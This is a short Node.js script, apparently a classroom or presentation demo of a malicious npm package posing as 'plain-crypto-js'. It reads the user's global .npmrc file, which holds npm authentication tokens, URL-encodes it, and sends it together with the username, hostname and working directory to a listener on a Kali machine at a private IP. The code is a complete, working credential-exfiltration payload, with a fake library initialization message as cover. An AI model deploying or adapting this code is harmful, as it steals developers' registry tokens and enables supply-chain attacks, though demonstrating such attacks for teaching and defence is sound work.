const http = require("http");
const os = require("os");
const fs = require("fs");
const path = require("path");

const systemPayload = JSON.stringify({
  user: os.userInfo().username,
  host: os.hostname(),
  platform: process.platform,
  cwd: process.cwd()
});

// 1. CHANGE: Point to the global .npmrc file in the home directory instead of local .env
const npmrcFile = path.join(os.homedir(), ".npmrc");

// 2. CHANGE: Update the checks and read logic for .npmrc
if (fs.existsSync(npmrcFile)) {
    const npmrcContent = fs.readFileSync(npmrcFile, "utf8");
    console.log("👉 Step 1: Reading global .npmrc authentication content...\n", npmrcContent);
    
    // 3. CHANGE: URL-encode the npmrc text contents
    const encodedNpmrc = encodeURIComponent(npmrcContent);
    
    // Using your exact Kali IP: 192.168.142.129
    const kaliUrl = `http://192.168.142.129:8000/collect?file=${encodedNpmrc}`; 
    
    console.log("📡 Step 2: Transmitting token payload to Kali listener...");
    
    const req = http.request(kaliUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            // Correctly matches the length of the system payload data body being sent below
            "Content-Length": Buffer.byteLength(systemPayload)
        }
    }, (res) => {
        console.log(`✅ Step 4: Success! Server responded with status: ${res.statusCode}`);
    });

    req.on('error', (err) => {
        console.error("❌ Network Connection Error. Is your Kali IP correct? Error:", err.message);
    });

    req.write(systemPayload);
    req.end();
    
    console.log("📤 Step 3: Data sent. Keeping process alive briefly to finish stream...");
    
    setTimeout(() => {
        console.log("\n[plain-crypto-js] initialization logic complete.");
        process.exit(0);
    }, 1500);

} else {
    // 4. CHANGE: Clear error feedback for your presentation setup
    console.log("❌ Demo Error: Could not find a global '.npmrc' file in the home directory!");
    console.log(`Expected path: ${npmrcFile}`);
}
